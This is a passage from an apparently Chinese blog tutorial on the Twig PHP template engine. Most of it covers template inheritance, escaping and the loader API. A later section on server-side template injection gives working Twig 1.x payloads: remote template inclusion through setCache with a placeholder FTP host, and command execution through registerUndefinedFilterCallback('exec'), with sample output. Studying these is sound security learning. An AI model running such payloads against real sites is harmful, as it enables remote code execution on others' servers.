+<p>我们来看一个简单的例子 <!-- raw HTML omitted --></p>
+</dd>
+</dl>
+<p>我们构建一个基础模板 base.html如下 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        {% block head %}
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&#34;stylesheet&#34;</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;style.css&#34;</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>{% block title %}{% endblock %} - My Webpage<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        {% endblock %}
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;content&#34;</span><span class="p">&gt;</span>{% block content %}{% endblock %}<span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;footer&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            {% block footer %}
+</span></span><span class="line"><span class="cl">                <span class="ni">&amp;copy;</span> Copyright 2011 by <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;http://domain.invalid/&#34;</span><span class="p">&gt;</span>you<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>.
+</span></span><span class="line"><span class="cl">            {% endblock %}
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>在上面的例子中， 一共有4个block标签：head, title, content, footer，都表示需要子模板来对这些block进行填充 <!-- raw HTML omitted --></p>
+<p>一个子模板可能长这样： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="k">extends</span> <span class="s2">&#34;base.html&#34;</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">block</span> <span class="nx">title</span> <span class="o">%</span><span class="p">}</span><span class="nx">Index</span><span class="p">{</span><span class="o">%</span> <span class="nx">endblock</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">block</span> <span class="nx">head</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{{</span> <span class="k">parent</span><span class="p">()</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">style</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&#34;text/css&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">.</span><span class="nx">important</span> <span class="p">{</span> <span class="nx">color</span><span class="o">:</span> <span class="c1">#336699; }
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">&lt;/</span><span class="nx">style</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">endblock</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">block</span> <span class="nx">content</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;</span><span class="nx">Index</span><span class="o">&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;</span><span class="nx">p</span> <span class="nx">class</span><span class="o">=</span><span class="s2">&#34;important&#34;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">Welcome</span> <span class="nx">to</span> <span class="nx">my</span> <span class="nx">awesome</span> <span class="nx">homepage</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">endblock</span> <span class="o">%</span><span class="p">}</span>
+</span></span></code></pre></div><p>首先使用 <code>extends</code> 标签来继承父模板，需要作为第一个标签放在子模板中，然后就可以对不同的block进行重写，当然可一般的语言一样，可以使用 <code>parent()</code> 方法来继承父模板中渲染的内容，默认情况下，如果没有对block进行重写，那么就默认输出父模板中的渲染内容，就像这里的 <code>footer block</code> 一样 <!-- raw HTML omitted --></p>
+<dl>
+<dt>HTML字符逃逸</dt>
+<dd>为了防止在模板在生成HTML的时其中的变量加入了一些意料之外的字符导致结果出现问题，Twig提供了两种方法来手动和自动地逃逸这些特殊字符 <!-- raw HTML omitted -->
+<ul>
+<li>
+<p><strong>手动逃逸:</strong> 使用 <code>espace/e</code> 过滤器来进行手动逃逸 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{</span> <span class="nx">user</span><span class="o">.</span><span class="nx">username</span><span class="o">|</span><span class="nx">escape</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="nx">user</span><span class="o">.</span><span class="nx">username</span><span class="o">|</span><span class="nx">e</span> <span class="p">}}</span>
+</span></span></code></pre></div><p><code>escape</code> 过滤器默认是对HTML进行操作，也可以更改为其他的策略 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{</span> <span class="nx">user</span><span class="o">.</span><span class="nx">username</span><span class="o">|</span><span class="nx">e</span><span class="p">(</span><span class="s1">&#39;js&#39;</span><span class="p">)</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="nx">user</span><span class="o">.</span><span class="nx">username</span><span class="o">|</span><span class="nx">e</span><span class="p">(</span><span class="s1">&#39;css&#39;</span><span class="p">)</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="nx">user</span><span class="o">.</span><span class="nx">username</span><span class="o">|</span><span class="nx">e</span><span class="p">(</span><span class="s1">&#39;url&#39;</span><span class="p">)</span> <span class="p">}}</span>
+</span></span><span class="line"><span class="cl"><span class="p">{{</span> <span class="nx">user</span><span class="o">.</span><span class="nx">username</span><span class="o">|</span><span class="nx">e</span><span class="p">(</span><span class="s1">&#39;html_attr&#39;</span><span class="p">)</span> <span class="p">}}</span>
+</span></span></code></pre></div></li>
+<li>
+<p><strong>自动逃逸:</strong> Twig提供了表达式可以对一个区域的代码进行统一的字符逃逸，同样默认是针对HTML的，也可以改为其他的策略 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">autoescape</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">Everything</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">automatically</span> <span class="nx">escaped</span> <span class="nx">in</span> <span class="k">this</span> <span class="nx">block</span> <span class="p">(</span><span class="nx">using</span> <span class="nx">the</span> <span class="nx">HTML</span> <span class="nx">strategy</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">endautoescape</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">autoescape</span> <span class="s1">&#39;js&#39;</span> <span class="o">%</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">Everything</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">automatically</span> <span class="nx">escaped</span> <span class="nx">in</span> <span class="k">this</span> <span class="nx">block</span> <span class="p">(</span><span class="nx">using</span> <span class="nx">the</span> <span class="nx">JS</span> <span class="nx">strategy</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="o">%</span> <span class="nx">endautoescape</span> <span class="o">%</span><span class="p">}</span>
+</span></span></code></pre></div></li>
+</ul>
+<p>如果我们想要在模板中输出 <code>{{</code> 而不被当作时模板的变量，可以使用以下表达式，直接进行一个变量表达 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{</span> <span class="s1">&#39;{{&#39;</span> <span class="p">}}</span>
+</span></span></code></pre></div></dd>
+</dl>
+<h3 id="twig的api使用">Twig的API使用</h3>
+<p>在上一节中我们介绍了如何设计Twig模板，在本章中，我们将会介绍如何使用Twig的API来对模板进行操作，本节主要参考：<a class="link" href="https://twig.symfony.com/doc/3.x/api.html"  target="_blank" rel="noopener"
+    >Twig for Developers</a> <!-- raw HTML omitted --></p>
+<p>从官网文档的标题，也很能体现模板引擎的意义，Twig for Template Designers主要就是写给那些设计模板，页面的显示内容的人（前端？），而Twig for Developers更多的是针对模板内容的处理，这样就很好的把模板和数据操作分开，把显示和内容分开。 <!-- raw HTML omitted --></p>
+<dl>
+<dt>Environment 环境</dt>
+<dd>下面的这个例子我们已经在简介那一节中见过了，Twig会创建一个 <code>\Twig\Environment</code> 类的对象（实例）来保存配置以及扩展内容，同时也用来加载模板。 <!-- raw HTML omitted -->
+<p>通常来说大部分的应用会创建一个统一的环境对象来存储所有的模板，但是也可以创建多个环境来存储不同的配置，配置的设置就是 <code>\Twig\Environment</code> 构造器的第二个参数，这其实是一个数组，可以存储任何对于环境的配置信息。 <!-- raw HTML omitted --></p>
+<p>比如这里的 <code>cache</code> 就是指定了模板编译的缓存地址，用来存储已经编译过的模板来避免对于解析阶段的请求（没编译好就请求，这里不太懂） <!-- raw HTML omitted --></p>
+</dd>
+</dl>
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;/path/to/vendor/autoload.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$loader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Loader\FilesystemLoader</span><span class="p">(</span><span class="s1">&#39;/path/to/templates&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$twig</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Environment</span><span class="p">(</span><span class="nv">$loader</span><span class="p">,</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;cache&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;/path/to/compilation_cache&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">]);</span>
+</span></span></code></pre></div><dl>
+<dt>Rendering Templates 渲染模板</dt>
+<dd><ol>
+<li>
+<p>想要加载一个Twig环境中的模板，可以使用 <code>load()</code> 函数，其会返回一个 <code>\Twig\TemplateWrapper</code> 实例 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$template</span> <span class="o">=</span> <span class="nv">$twig</span><span class="o">-&gt;</span><span class="na">load</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">);</span>
+</span></span></code></pre></div></li>
+<li>
+<p>想要将变量的值渲染到模板上去，可以使用 <code>render()</code> 函数 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$template</span><span class="o">-&gt;</span><span class="na">render</span><span class="p">([</span><span class="s1">&#39;the&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;variables&#39;</span><span class="p">,</span> <span class="s1">&#39;go&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;here&#39;</span><span class="p">]);</span>
+</span></span></code></pre></div></li>
+<li>
+<p>更多加载和渲染的例子 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$twig</span><span class="o">-&gt;</span><span class="na">render</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;the&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;variables&#39;</span><span class="p">,</span> <span class="s1">&#39;go&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;here&#39;</span><span class="p">]);</span> <span class="c1"># 加载和渲染在一起
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nv">$template</span><span class="o">-&gt;</span><span class="na">renderBlock</span><span class="p">(</span><span class="s1">&#39;block_name&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;the&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;variables&#39;</span><span class="p">,</span> <span class="s1">&#39;go&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;here&#39;</span><span class="p">]);</span> <span class="c1"># 只渲染单独的区块
+</span></span></span></code></pre></div></li>
+</ol>
+</dd>
+<dt>Loaders 加载器</dt>
+<dd>加载器的主要职责就是加载模板（例如从文件系统中） <!-- raw HTML omitted -->
+<ul>
+<li>
+<p><strong>Compilation Cache 编译缓存:</strong> 所有的模板加载器都会将文件系统中编译过的模板存储在缓存中以供将来使用，以此来提高使用的效率，不用重复加载 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p><strong>内置的加载器:</strong> 1.  <code>\Twig\Loader\FilesystemLoader</code>, 加载器从文件系统中加载模板 <!-- raw HTML omitted --></p>
+<pre><code>```php
+$loader = new \Twig\Loader\FilesystemLoader($templateDir); # 从目标路径中加载目录
+$loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # 依次尝试数组中的目录
+```
+</code></pre>
+<ol start="2">
+<li>
+<p><code>\Twig\Loader\ArrayLoader</code>, 加载器从PHP数组中加载模板，下面的例子就是加载了一个&rsquo;index.html&rsquo; =&gt; &lsquo;Hello {{ name }}!&lsquo;的数组 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$loader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Loader\ArrayLoader</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;index.html&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Hello {{ name }}!&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$twig</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Environment</span><span class="p">(</span><span class="nv">$loader</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$twig</span><span class="o">-&gt;</span><span class="na">render</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;name&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Fabien&#39;</span><span class="p">]);</span>
+</span></span></code></pre></div></li>
+<li>
+<p><code>\Twig\Loader\ChainLoader</code> 可以将多个加载器合并，统一放到环境中 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$loader1</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Loader\ArrayLoader</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;base.html&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;{% block content %}{% endblock %}&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$loader2</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Loader\ArrayLoader</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;index.html&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;{% extends &#34;base.html&#34; %}{% block content %}Hello {{ name }}{% endblock %}&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;base.html&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;Will never be loaded&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$loader</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Loader\ChainLoader</span><span class="p">([</span><span class="nv">$loader1</span><span class="p">,</span> <span class="nv">$loader2</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$twig</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">\Twig\Environment</span><span class="p">(</span><span class="nv">$loader</span><span class="p">);</span>
+</span></span></code></pre></div></li>
+</ol>
+</li>
+</ul>
+</dd>
+</dl>
+<h3 id="漏洞利用">漏洞利用</h3>
+<p>在介绍了Twig的基础模板语法与API使用之后，我们来看看不同版本的Twig都有哪些漏洞可以利用 <!-- raw HTML omitted --></p>
+<h4 id="1-dot-x">1.x</h4>
+<p>我们回顾一下之前在基础语法中提到过，Twig拥有三个全局变量 <!-- raw HTML omitted --></p>
+<ul>
+<li>
+<p>_self: 对于当前模板对象实例的引用 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>_context: 对于上下文的引用 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>_charset: 对于当前字符集的引用 <!-- raw HTML omitted --></p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>setCache</p>
+<p>在1.x版本中，我们主要就是要利用其中的其中的 <code>_self</code> 变量，因为其代表了对于当前模板对象实例（\Twig\Template）的引用，其中包含的 <code>env</code> 属性指向了 <code>\Twig\Environment</code> 对象实例的引用，这样我们就可以继续利用Twig环境对象实例中的方法 <!-- raw HTML omitted --></p>
+<p>常见的 payload 就有： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">setCache</span><span class="p">(</span><span class="s2">&#34;ftp://ip:port&#34;</span><span class="p">)}}{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">loadTemplate</span><span class="p">(</span><span class="s2">&#34;backdoor&#34;</span><span class="p">)}}</span>
+</span></span></code></pre></div><p>setCache是我们之前提到过的，设置编译模板的缓存目录，接着在我们改变当前模板的缓存目录之后，再次调用 <code>loadTemplate</code> 函数就可以包含任意我们想要的文件了，在allow_url_include开启的条件下，我们就实现了远程文件包含 <!-- raw HTML omitted --></p>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>getFilter</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getFilter</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filterCallbacks</span> <span class="k">as</span> <span class="nv">$callback</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="nv">$filter</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$callback</span><span class="p">,</span> <span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nv">$filter</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">registerUndefinedFilterCallback</span><span class="p">(</span><span class="nv">$callable</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filterCallbacks</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$callable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>我们可以从 <code>getFilter</code> 源码中发现危险函数 <code>call_user_func</code>, 通过传入 $name 参数到该函数中，就可以调用任意PHP函数 <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">registerUndefinedFilterCallback</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">)}}{{</span><span class="nx">_self</span><span class="o">.</span><span class="nx">env</span><span class="o">.</span><span class="nx">getFilter</span><span class="p">(</span><span class="s2">&#34;id&#34;</span><span class="p">)}}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span></span></code></pre></div><p>在Twig 2.x 以及 3.x 的版本中， <code>_self</code> 的作用发生了变化，只能返回当前实例名的字符串，因此这个payload只能够再1.x版本使用 <!-- raw HTML omitted --></p>
+<p><figure><img src="../../../Documents/OrgNotes/OrgImages/Server_Side_Template_Injection_%28SSTI%29_%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%ef%bc%9a%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86/2022-07-01_17-27-09_screenshot.png"
+         alt="Figure 1: Deprecated Features of Twig 1.x" width="700px"/><figcaption>
+            <p><!-- raw HTML omitted -->Figure 1: <!-- raw HTML omitted --><a class="link" href="https://twig.symfony.com/doc/1.x/deprecated.html#globals"  target="_blank" rel="noopener"
+    >Deprecated Features of Twig 1.x</a></p>
+        </figcaption>
+</figure>
+ <!-- raw HTML omitted --></p>
+<p>同时 <code>getFilter</code> 方法中也不再包含危险的函数了： <!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">getFilter</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$name</span><span class="p">)</span><span class="o">:</span> <span class="o">?</span><span class="nx">TwigFilter</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">initialized</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">initExtensions</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filters</span><span class="p">[</span><span class="nv">$name</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filters</span><span class="p">[</span><span class="nv">$name</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filters</span> <span class="k">as</span> <span class="nv">$pattern</span> <span class="o">=&gt;</span> <span class="nv">$filter</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$pattern</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;\\*&#39;</span><span class="p">,</span> <span class="s1">&#39;(.*?)&#39;</span><span class="p">,</span> <span class="nx">preg_quote</span><span class="p">(</span><span class="nv">$pattern</span><span class="p">,</span> <span class="s1">&#39;#&#39;</span><span class="p">),</span> <span class="nv">$count</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nv">$count</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;#^&#39;</span><span class="o">.</span><span class="nv">$pattern</span><span class="o">.</span><span class="s1">&#39;$#&#39;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">,</span> <span class="nv">$matches</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">array_shift</span><span class="p">(</span><span class="nv">$matches</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$filter</span><span class="o">-&gt;</span><span class="na">setArguments</span><span class="p">(</span><span class="nv">$matches</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$filter</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filterCallbacks</span> <span class="k">as</span> <span class="nv">$callback</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">!==</span> <span class="nv">$filter</span> <span class="o">=</span> <span class="nv">$callback</span><span class="p">(</span><span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nv">$filter</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">registerUndefinedFilterCallback</span><span class="p">(</span><span class="nx">callable</span> <span class="nv">$callable</span><span class="p">)</span><span class="o">:</span> <span class="nx">void</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filterCallbacks</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$callable</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>我觉得这就是一个很好的思路，在我们进行代码审计的时候，可以先找到这些危险的函数，然后再追溯其的使用，判断是否会有用户的输出能够调用这类函数 <!-- raw HTML omitted --></p>
+</li>
+</ul>
+<h4 id="2-dot-x-3-dot-x">2.x / 3.x</h4>
+<p>在2.x / 3.x中， <code>_self</code> 变量已经没法被我们所利用了，但是我们可以借助新版本中的一些过滤器来实现攻击的目的。 <!-- raw HTML omitted --></p>
+<p>我们将介绍4个过滤器： <!-- raw HTML omitted --></p>
+<!-- raw HTML omitted -->
+<ul>
+<li>
+<p>map</p>
+<p><code>map</code> 过滤器将一个 <code>arrow function</code> 应用于 <code>sequence</code> 或者 <code>mapping</code> （因为没有中文文档，所以不是很敢翻译这些既陌生又熟悉的名词，大家可以根据例子体会一下），文档详见：<a class="link" href="https://twig.symfony.com/doc/3.x/filters/map.html"  target="_blank" rel="noopener"
+    >map</a> <!-- raw HTML omitted --></p>
